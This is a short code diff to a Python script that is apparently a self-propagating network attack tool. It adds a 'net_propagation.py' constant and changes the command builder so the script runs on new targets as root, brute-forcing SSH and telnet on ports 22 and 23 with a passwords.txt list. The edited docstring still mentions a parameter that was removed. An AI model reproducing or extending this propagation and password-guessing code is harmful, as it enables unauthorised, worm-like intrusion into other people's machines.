@@ -120,6 +120,9 @@ LOOPBACK = "lo"
 # The main function call.
 MAIN = "main()"
 
+# The name of the net propagation script.
+NET_PROPAGATION = "net_propagation.py"
+
 # Just the numerical form of the number one, again, memory preservation.
 ONE = "1"
 
@@ -421,17 +424,16 @@ def help_output():
         ARGUMENT_PWS_FILENAME + " " + PWDS_LIST
 
 
-def run_script_command(filename, username):
+def run_script_command(filename):
     """
     This function will run the propagation script on another target machine
     over any service
     :param filename: The file that holds the propagation script
-    :param username: The username to run against the propagation script as a
-    parameter
-    :return "net_attack.py -L -p 22,23 -u " + username + " -f passwords.txt
+    :return "net_propagation.py -L -p 22,23 -u " + username + " -f
+    passwords.txt
     -P": The command itself
     """
-    return filename + " -L -p 22,23 -u " + username + " -f passwords.txt -P"
+    return filename + " -L -p 22,23 -u " + ROOT + " -f passwords.txt -P"
 
 
 def web_login_url(ip, port):
